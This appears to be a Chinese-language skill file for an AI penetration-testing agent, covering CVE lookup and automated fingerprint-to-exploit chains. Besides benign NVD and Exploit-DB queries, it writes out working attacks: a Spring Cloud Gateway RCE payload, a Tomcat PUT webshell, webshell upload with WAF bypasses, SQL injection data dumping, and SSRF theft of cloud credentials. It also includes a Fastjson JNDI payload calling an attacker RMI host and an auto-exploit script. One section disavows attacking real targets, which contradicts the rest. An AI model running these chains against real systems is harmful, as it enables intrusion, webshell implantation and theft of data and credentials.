---
name: vuln-intel
description: >-
  漏洞情报聚合 — 实时CVE搜索、Exploit-DB集成、产品漏洞追踪、指纹→漏洞→利用自动映射
domain: cybersecurity
subdomain: threat-intelligence
tags:
- cve
- exploit
- intelligence
- nvd
- exploitdb
version: '1.0'
author: zxygeitio
license: Apache-2.0
mitre_attack:
- T1588
- T1592
nist_csf:
- ID.RA-01
---
# 漏洞情报聚合 (Vulnerability Intelligence)

## 概述

从指纹识别到漏洞发现到利用代码的全链路自动化。不再手动搜CVE。

```
技术栈指纹 → 自动搜索CVE → 匹配Exploit → 生成攻击命令
     ↓              ↓              ↓              ↓
  nuclei        NVD/CNVD      searchsploit      msfconsole
  whatweb       GitHub SA      exploit-db        sqlmap
  wappalyzer    CNNVD          packetstorm       手工POC
```

## 1. 实时CVE搜索

### 1.1 NVD API (最快, 免费)

```bash
# 搜索产品CVE (按CVSS排序)
search_nvd() {
    local product="$1"
    local api_key="${NVD_API_KEY:-}"
    local url="https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${product}&resultsPerPage=20"
    [ -n "$api_key" ] && url="${url}&apiKey=${api_key}"
    
    curl -s "$url" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for vuln in data.get('vulnerabilities', []):
    cve = vuln['cve']
    cve_id = cve['id']
    desc = cve['descriptions'][0]['value'][:120] if cve['descriptions'] else 'N/A'
    metrics = cve.get('metrics', {})
    cvss = 'N/A'
    for key in ['cvssMetricV31', 'cvssMetricV30', 'cvssMetricV2']:
        if key in metrics:
            cvss = metrics[key][0]['cvssData']['baseScore']
            break
    print(f'{cve_id} | CVSS:{cvss} | {desc}')
" 2>/dev/null
}

# 用法
search_nvd "apache struts"
search_nvd "spring boot"
search_nvd "tomcat"
search_nvd "nginx"
```

### 1.2 GitHub Security Advisories (有POC的优先)

```bash
# 搜索GitHub上的安全公告和POC
search_github_advisory() {
    local product="$1"
    curl -s "https://api.github.com/search/repositories?q=${product}+CVE+poc&sort=updated&per_page=10" | \
        python3 -c "
import sys, json
data = json.load(sys.stdin)
for repo in data.get('items', []):
    print(f\"{repo['full_name']} | ⭐{repo['stargazers_count']} | {repo['description'][:80] if repo['description'] else 'N/A'}\")
    print(f\"  → {repo['html_url']}\")
" 2>/dev/null
}

# 搜索特定CVE的POC
search_cve_poc() {
    local cve_id="$1"
    echo "=== GitHub POC ==="
    curl -s "https://api.github.com/search/repositories?q=${cve_id}&sort=stars&per_page=5" | \
        python3 -c "
import sys, json
data = json.load(sys.stdin)
for repo in data.get('items', []):
    if repo.get('description') and ('poc' in repo['description'].lower() or 'exploit' in repo['description'].lower() or 'rce' in repo['description'].lower()):
        print(f\"  ⭐{repo['stargazers_count']} {repo['full_name']}\")
        print(f\"    {repo['html_url']}\")
" 2>/dev/null
    
    echo "=== Exploit-DB ==="
    searchsploit "$cve_id" 2>/dev/null | head -10
}
```

### 1.3 CNVD/CNNVD (国内漏洞库)

```bash
# CNVD搜索 (需要cookie)
search_cnvd() {
    local keyword="$1"
    curl -s "https://www.cnvd.org.cn/flaw/list?keyword=${keyword}" \
        -H "User-Agent: Mozilla/5.0" | \
        grep -oP 'CNVD-[0-9]+-[0-9]+' | sort -u | head -20
}

# CNNVD搜索
search_cnnvd() {
    local keyword="$1"
    curl -s "https://www.cnnvd.org.cn/web/vulnerability/querylist.tag?keyword=${keyword}" \
        -H "User-Agent: Mozilla/5.0" | \
        grep -oP 'CNNVD-[0-9]{4}-[0-9]+' | sort -u | head -20
}
```

## 2. Exploit-DB 深度集成

### 2.1 searchsploit 高级用法 + 本地引擎

**首选: 本地 Python 引擎** (比 searchsploit 更灵活，支持版本范围匹配、指纹批量匹配、攻击脚本生成)

```bash
# 按产品+版本精确搜索 (引擎)
/usr/bin/python3 /root/.the agent/scripts/exploitdb_engine.py product "apache" "2.4.49"

# CVE搜索 (引擎)
/usr/bin/python3 /root/.the agent/scripts/exploitdb_engine.py cve CVE-2021-44228

# 高价值RCE (引擎)
/usr/bin/python3 /root/.the agent/scripts/exploitdb_engine.py rce --limit 20

# nmap XML自动匹配 (引擎)
/usr/bin/python3 /root/.the agent/scripts/exploitdb_engine.py nmap /tmp/scan.xml

# 指纹→exploit→攻击脚本全链路 (管道)
/usr/bin/python3 /root/.the agent/scripts/edb-pipeline.py --nmap /tmp/scan.xml --target HOST --script /tmp/attack.sh

# 详细用法见 exploit-db-integration skill
```

**备选: searchsploit CLI** (与引擎共享同一数据源)

```bash
# 按产品+版本精确搜索
search_exploit() {
    local product="$1"
    local version="${2:-}"
    
    echo "=== Exploit-DB ==="
    if [ -n "$version" ]; then
        searchsploit "${product} ${version}" 2>/dev/null | grep -v "^Exploits" | head -20
    else
        searchsploit "$product" 2>/dev/null | grep -v "^Exploits" | head -20
    fi
    
    echo ""
    echo "=== Metasploit ==="
    msfconsole -q -x "search ${product}; exit" 2>/dev/null | grep -i "exploit\|auxiliary" | head -15
}

# 获取exploit详情和用法
get_exploit_detail() {
    local edb_id="$1"
    searchsploit -x "$edb_id" 2>/dev/null | head -50
}

# 复制exploit到工作目录
copy_exploit() {
    local edb_id="$1"
    local dest="${2:-/tmp/exploits/}"
    mkdir -p "$dest"
    searchsploit -m "$edb_id" "$dest" 2>/dev/null
    echo "已复制到: $dest"
}

# 批量搜索产品的所有exploit
batch_search() {
    local product="$1"
    echo "=== ${product} 漏洞利用清单 ==="
    searchsploit --json "$product" 2>/dev/null | python3 -c "
import sys, json
data = json.load(sys.stdin)
for exp in data.get('RESULTS_EXPLOIT', []):
    print(f\"  {exp.get('EDB-ID','?')} | {exp.get('Title','?')[:60]} | {exp.get('Type','?')} | {exp.get('Platform','?')}\")
" 2>/dev/null
}
```

### 2.2 漏洞模板自动生成

```bash
# 根据CVE生成nuclei模板检测命令
generate_nuclei_cmd() {
    local cve_id="$1"
    local target="$2"
    
    # 查找对应模板
    template=$(find /root/nuclei-templates/ -name "*${cve_id}*" -type f 2>/dev/null | head -1)
    if [ -n "$template" ]; then
        echo "nuclei -u $target -t $template"
    else
        echo "# 无对应nuclei模板, 尝试手动利用"
        searchsploit "$cve_id" 2>/dev/null | head -5
    fi
}

# 根据技术栈生成完整扫描命令
generate_scan_cmd() {
    local target="$1"
    local tech="$2"  # 如 "spring", "tomcat", "nginx", "apache"
    
    case "$tech" in
        spring)
            cat << 'EOF'
# Spring Boot 全面扫描
nuclei -u TARGET -t /root/nuclei-templates/http/vulnerabilities/spring/ -severity critical,high
nuclei -u TARGET -t /root/nuclei-templates/http/cves/2022/ -severity critical,high
# Actuator端点
for ep in env beans configprops heapdump mappings health info; do
    curl -sk "TARGET/actuator/$ep" -o /dev/null -w "$ep: %{http_code}\n"
done
# Spring Cloud Gateway RCE (CVE-2022-22947)
curl -sk -X POST "TARGET/actuator/gateway/routes/hacktest" \
    -H "Content-Type: application/json" \
    -d '{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],"uri":"http://example.com"}'
EOF
            ;;
        tomcat)
            cat << 'EOF'
# Tomcat 全面扫描
nuclei -u TARGET -t /root/nuclei-templates/http/vulnerabilities/tomcat/
# Manager弱口令
hydra -L /usr/share/wordlists/tomcat.txt -P /usr/share/wordlists/tomcat.txt TARGET http-get /manager/html
# AJP Ghostcat (CVE-2020-1938)
python3 /opt/ghostcat/ghostcat.py -p 8009 TARGET
# PUT上传 (CVE-2017-12615)
curl -X PUT "TARGET/test.jsp/" -d '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
EOF
            ;;
        nginx)
            cat << 'EOF'
# nginx 漏洞扫描
nuclei -u TARGET -t /root/nuclei-templates/http/vulnerabilities/nginx/
# 路径遍历 (CVE-2021-23017)
# 配置泄露
for p in /nginx_status /nginx.conf /../etc/passwd; do
    curl -sk "TARGET$p" -o /dev/null -w "$p: %{http_code}\n"
done
EOF
            ;;
    esac
}
```

## 3. 指纹→漏洞自动映射

### 3.1 技术栈CVE速查表

```bash
# 一键查询技术栈的所有已知漏洞
query_tech_vulns() {
    local tech="$1"
    local version="${2:-}"
    
    echo "=========================================="
    echo "  技术栈漏洞查询: ${tech} ${version}"
    echo "=========================================="
    
    # 1. Exploit-DB
    echo ""
    echo "[1/3] Exploit-DB:"
    searchsploit "${tech} ${version}" 2>/dev/null | grep -v "^Exploits\|^---" | head -15
    
    # 2. NVD
    echo ""
    echo "[2/3] NVD CVE:"
    search_nvd "${tech} ${version}" 2>/dev/null | head -10
    
    # 3. Nuclei模板
    echo ""
    echo "[3/3] Nuclei模板:"
    find /root/nuclei-templates/ -name "*${tech}*" -type f 2>/dev/null | head -10
}
```

### 3.2 常见技术栈高危漏洞速查

| 技术栈 | 高危CVE | 利用方式 | 检测命令 |
|--------|---------|---------|---------|
| Spring Boot | CVE-2022-22947 | Gateway RCE | `nuclei -t spring-cloud-gateway-rce.yaml` |
| Spring Boot | CVE-2022-22965 | Spring4Shell | `curl -k "target/?class.module.classLoader.URLs%5B0%5D=0"` |
| Apache Struts | CVE-2017-5638 | RCE via Content-Type | `curl -H "Content-Type: %{(#_='multipart/form-data')...}"` |
| Log4j | CVE-2021-44228 | JNDI注入 | `curl -H "X-Api-Version: ${jndi:ldap://x/a}" target` |
| Tomcat | CVE-2020-1938 | AJP Ghostcat | `python3 ghostcat.py -p 8009 target` |
| Tomcat | CVE-2017-12615 | PUT上传 | `curl -X PUT "target/test.jsp/" -d '...'` |
| Nginx | CVE-2021-23017 | DNS解析器漏洞 | `nuclei -t CVE-2021-23017.yaml` |
| Redis | CVE-2022-0543 | Lua沙箱逃逸 | `redis-cli eval '...' 0` |
| Confluence | CVE-2022-26134 | OGNL注入RCE | `curl "target/%24%7B%40...%7D/action..."` |
| Fastjson | CVE-2022-25845 | 反序列化RCE | `{"@type":"java.lang.AutoCloseable",...}` |
| Shiro | CVE-2016-4437 | RememberMe反序列化 | `shiro_exploit.py -t target` |
| Weblogic | CVE-2023-21839 | IIOP/T3反序列化 | `java -jar WebLogic-Exploit.jar` |
| Druid | CNVD-2021-32943 | 未授权访问 | `curl target/druid/index.html` |
| Swagger | - | API文档泄露 | `curl target/swagger-ui.html` |
| Actuator | - | 端点未授权 | `curl target/actuator/env` |

### 3.3 自动化指纹→漏洞匹配脚本

```bash
#!/bin/bash
# auto_vuln_match.sh - 从nmap/nuclei结果自动匹配漏洞
TARGET="$1"

echo "[*] 从nmap结果提取服务版本..."
grep "^[0-9].*open" /tmp/${TARGET}_recon/nmap_quick.txt 2>/dev/null | while read line; do
    port=$(echo "$line" | awk -F/ '{print $1}')
    service=$(echo "$line" | awk '{print $3}')
    version=$(echo "$line" | cut -d' ' -f4-)
    
    echo ""
    echo "=== Port $port: $service $version ==="
    
    # 自动搜索对应exploit
    if [ "$service" != "unknown" ]; then
        searchsploit "$service $version" 2>/dev/null | grep -v "^Exploits\|^---" | head -5
    fi
done

# 从HTTP指纹提取CMS/框架
echo ""
echo "[*] 从HTTP指纹提取技术栈..."
grep -iE "server:|x-powered-by:|x-generator:" /tmp/${TARGET}_recon/headers_https.txt 2>/dev/null | while read line; do
    tech=$(echo "$line" | cut -d: -f2- | xargs)
    echo "技术栈: $tech"
    searchsploit "$tech" 2>/dev/null | grep -v "^Exploits\|^---" | head -5
done
```

## 4. 漏洞验证自动化

### 4.1 SQL注入完整利用链

```bash
# 从发现到利用的完整流程
sql_exploit_chain() {
    local url="$1"
    local param="$2"
    
    echo "[1/4] 检测注入..."
    sqlmap -u "${url}?${param}=1" --batch --level=3 --risk=2 --timeout=10 2>/dev/null | tail -20
    
    echo "[2/4] 枚举数据库..."
    sqlmap -u "${url}?${param}=1" --batch --dbs 2>/dev/null | tail -10
    
    echo "[3/4] 枚举表..."
    sqlmap -u "${url}?${param}=1" --batch --tables 2>/dev/null | tail -20
    
    echo "[4/4] 导出数据..."
    sqlmap -u "${url}?${param}=1" --batch --dump 2>/dev/null | tail -20
}
```

### 4.2 文件上传→Webshell→RCE

```bash
# 文件上传利用链
upload_exploit_chain() {
    local upload_url="$1"
    local target="$2"
    
    echo "[1/3] 检测上传点..."
    # 尝试各种绕过
    for ext in php php3 php5 phtml phar jsp aspx ashx; do
        code=$(curl -sk -X POST "$upload_url" \
            -F "file=@/tmp/shell.${ext};filename=test.${ext}" \
            -o /dev/null -w "%{http_code}")
        echo "  .${ext} → $code"
    done
    
    echo "[2/3] 绕过WAF上传..."
    # 双扩展名
    curl -sk -X POST "$upload_url" \
        -F "file=@/tmp/shell.php;filename=shell.php.jpg" \
        -o /dev/null -w "双扩展: %{http_code}\n"
    # Content-Type绕过
    curl -sk -X POST "$upload_url" \
        -F "file=@/tmp/shell.php;filename=shell.php;type=image/jpeg" \
        -o /dev/null -w "MIME绕过: %{http_code}\n"
    
    echo "[3/3] 验证Webshell..."
    curl -sk "${target}/uploads/shell.php?cmd=id" 2>/dev/null
}
```

### 4.3 SSRF→内网访问→横向移动

```bash
# SSRF利用链
ssrf_exploit_chain() {
    local vulnerable_url="$1"
    local param="$2"
    
    echo "[1/4] 验证SSRF..."
    curl -sk "${vulnerable_url}?${param}=http://127.0.0.1:80" -o /dev/null -w "%{http_code}\n"
    
    echo "[2/4] 探测内网..."
    for ip in 10.0.0.1 172.16.0.1 192.168.1.1; do
        for port in 80 443 8080 3306 6379 9200; do
            result=$(curl -sk --max-time 3 "${vulnerable_url}?${param}=http://${ip}:${port}" -o /dev/null -w "%{http_code}")
            [ "$result" != "000" ] && [ "$result" != "500" ] && echo "  ${ip}:${port} → $result"
        done
    done
    
    echo "[3/4] 读取云元数据..."
    curl -sk "${vulnerable_url}?${param}=http://169.254.169.254/latest/meta-data/" 2>/dev/null | head -20
    # AWS
    curl -sk "${vulnerable_url}?${param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null
    # 阿里云
    curl -sk "${vulnerable_url}?${param}=http://100.100.100.200/latest/meta-data/" 2>/dev/null
    
    echo "[4/4] 读取内部服务..."
    # Redis
    curl -sk "${vulnerable_url}?${param}=gopher://127.0.0.1:6379/_INFO" 2>/dev/null | head -10
    # 内部API
    curl -sk "${vulnerable_url}?${param}=http://internal-api:8080/api/users" 2>/dev/null | head -10
}
```

### 4.4 反序列化RCE利用链

```bash
# Java反序列化利用链
deser_exploit_chain() {
    local target="$1"
    local endpoint="$2"
    
    echo "[1/3] 检测反序列化端点..."
    # Shiro RememberMe
    curl -sk "$target" -H "Cookie: rememberMe=1" -D- 2>/dev/null | grep -i "rememberme\|set-cookie"
    
    # Fastjson
    curl -sk -X POST "$target$endpoint" \
        -H "Content-Type: application/json" \
        -d '{"@type":"java.lang.AutoCloseable"}' 2>/dev/null | head -5
    
    echo "[2/3] 生成payload..."
    # Shiro默认密钥
    echo "  Shiro默认密钥测试: kPH+bIxk5D2deZiIxcaaaA=="
    
    echo "[3/3] 执行命令..."
    # 使用ysoserial
    # java -jar ysoserial.jar CommonsCollections1 "id" | base64
}
```

## 5. 情报驱动的自动化工作流

### 5.1 指纹→漏洞→利用 一键流程

```bash
#!/bin/bash
# auto_exploit.sh - 从指纹自动匹配并尝试利用
TARGET="$1"
OUTDIR="/tmp/${TARGET}_exploit"
mkdir -p "$OUTDIR"

echo "=========================================="
echo "  自动漏洞利用流程: $TARGET"
echo "=========================================="

# Phase 1: 收集指纹
echo "[Phase 1] 收集技术栈指纹..."
TECHS=$(curl -skI "https://$TARGET/" 2>/dev/null | grep -iE "server:|x-powered-by:" | cut -d: -f2- | xargs)
CMS=$(curl -sk "https://$TARGET/" 2>/dev/null | grep -oiE "wordpress|drupal|joomla|spring|tomcat|thinkphp|laravel" | head -1)
echo "  技术栈: $TECHS"
echo "  CMS: $CMS"

# Phase 2: 搜索对应exploit
echo "[Phase 2] 搜索漏洞利用..."
for tech in $TECHS $CMS; do
    echo "--- $tech ---"
    searchsploit "$tech" 2>/dev/null | grep -iE "rce|upload|sqli|auth bypass|remote" | head -5
done > "$OUTDIR/exploits.txt"

# Phase 3: 尝试高危利用
echo "[Phase 3] 尝试高危漏洞利用..."

# Spring Boot Actuator
if echo "$TECHS" | grep -qi "spring"; then
    echo "  [!] Spring Boot → 测试Actuator..."
    for ep in env beans heapdump configprops; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/actuator/$ep")
        [ "$code" = "200" ] && echo "  [CRITICAL] /actuator/$ep 未授权访问!"
    done
fi

# Tomcat Manager
if echo "$TECHS" | grep -qi "tomcat"; then
    echo "  [!] Tomcat → 测试Manager..."
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/manager/html")
    [ "$code" = "401" ] && echo "  [!] Tomcat Manager存在, 尝试弱口令..."
fi

# WordPress
if [ "$CMS" = "wordpress" ]; then
    echo "  [!] WordPress → 全面扫描..."
    wpscan --url "https://$TARGET/" --enumerate vp,vt,u --random-user-agent 2>/dev/null | tail -20
fi

echo ""
echo "[完成] 详细结果: $OUTDIR/"
```

## 6. 漏洞情报按需查询

### 6.0 本机按需实时查询（当前策略）

用户已明确：the AI agent 并非 7×24 常驻，漏洞情报不应依赖每日自动 Cron；应在 SRC/渗透任务识别到产品、版本、组件或 CVE 时现场查询/刷新。

当前入口：

```bash
/root/.the agent/scripts/the agent-vuln-query.sh --keyword "spring boot" --refresh --days 30 --github-limit 10
/root/.the agent/scripts/the agent-vuln-query.sh "CVE-2021-44228" --refresh --github-limit 5
/root/.the agent/scripts/the agent-vuln-query.sh --local "nginx" --limit 20
```

底层脚本/数据：

- 查询入口：`/root/.the agent/scripts/the agent-vuln-query.sh`
- 刷新脚本：`/root/.the agent/scripts/update-vuln-intel.py`
- 本地缓存库：`/root/.the agent/vuln-intel/vuln_intel.db`
- 摘要缓存：`/root/.the agent/vuln-intel/latest.md`
- 原始数据：`/root/.the agent/vuln-intel/raw/`

数据源：
- NVD CVE API：按时间窗口拉取新增/更新 CVE。
- CISA KEV：标记已知被利用漏洞。
- Exploit-DB CSV：机会性提取 CVE 与 exploit 关联。
- GitHub repository search：按高价值 CVE 搜索公开 PoC；`GITHUB_TOKEN` 已配置在 `/root/.the agent/.env`，脚本会自动加载且不回显。

使用规则：
1. 不创建长期每日 CVE/POC Cron；需要时才查。
2. 识别到目标指纹/产品/版本/CVE 后，优先用 `the agent-vuln-query.sh --refresh` 做实时查询，再结合目标暴露面验证。
3. 本地 SQLite/latest.md 只是缓存，不代表最新真相；涉及当前目标时应刷新。
4. 新 CVE/PoC 只作为候选情报，不是漏洞结论；必须结合目标版本、暴露面、安全 PoC 和对照请求复核。
5. 不运行公开 exploit 攻击真实目标；只采集元数据、生成候选优先级和辅助安全验证。

### 6.1 自动监控新产品CVE

```bash
# 设置cron定时检查目标技术栈的新CVE
# crontab -e
# 0 9 * * * /path/to/check_new_cves.sh

check_new_cves() {
    local products=("spring boot" "tomcat" "nginx" "apache" "redis" "mysql")
    
    for product in "${products[@]}"; do
        echo "=== $product ==="
        # 获取最近7天的CVE
        curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${product}&resultsPerPage=5" | \
            python3 -c "
import sys, json
from datetime import datetime, timedelta
data = json.load(sys.stdin)
week_ago = (datetime.now() - timedelta(days=7)).strftime('%Y-%m-%d')
for vuln in data.get('vulnerabilities', []):
    cve = vuln['cve']
    pub = cve.get('published', '')[:10]
    if pub >= week_ago:
        print(f\"  NEW: {cve['id']} | {pub} | {cve['descriptions'][0]['value'][:80]}\")
" 2>/dev/null
    done
}
```

## 实战案例

### 案例1: Spring Boot Actuator → RCE

```
1. 指纹: Server头包含 "Spring-Boot"
2. 搜索: searchsploit spring boot → CVE-2022-22947 (CVSS 10.0)
3. 利用: 
   curl -X POST target/actuator/gateway/routes/hacktest \
     -H "Content-Type: application/json" \
     -d '{"filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{...exec(\"id\")}..."}}]}'
4. 结果: RCE确认, 拿到服务器权限
```

### 案例2: Shiro反序列化 → RCE

```
1. 指纹: Cookie包含 "rememberMe"
2. 搜索: searchsploit shiro → CVE-2016-4437 (CVSS 9.8)
3. 利用: 
   - 测试默认密钥: kPH+bIxk5D2deZiIxcaaaA==
   - 生成payload: java -jar ysoserial.jar CommonsCollections1 "id"
   - 发送: Cookie: rememberMe=<base64_payload>
4. 结果: 反序列化RCE, 拿到服务器权限
```

### 案例3: Fastjson → RCE

```
1. 指纹: API返回 "fastjson" 错误信息
2. 搜索: searchsploit fastjson → CVE-2022-25845 (CVSS 9.8)
3. 利用:
   POST /api/data
   Content-Type: application/json
   {"@type":"java.lang.AutoCloseable","x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker:1099/Exploit","autoCommit":true}}
4. 结果: JNDI注入RCE
```

## 参考资料

- `references/on-demand-vuln-query.md` — 当前按需漏洞情报策略：不默认创建每日 CVE/POC Cron，在识别产品/版本/CVE 时现场刷新查询，并把结果作为候选情报验证。
- `references/daily-cve-intel-pipeline.md` — 旧的每日 CVE/POC 情报库部署路径、Cron 限制、降级策略；仅在用户明确要求持久监控时参考。
- `references/github-token-for-poc-intel.md` — 用户提供 GitHub PAT 后的安全落库、无泄露验证、updater 自加载 `.env`、避免不必要 Gateway 重启的流程。
- `web-pentest-fast` skill 的 `references/waf-fingerprints-consolidated.md` — WAF指纹和绕过
- `web-pentest-fast` 或 `pentest-recon-driven` skill 的 `references/financial-src-testing-patterns.md` — 金融SRC漏洞模式
- `web-pentest-fast` — 外网Web快速渗透流程
- `pentest-recon-driven` — 信息收集驱动渗透测试
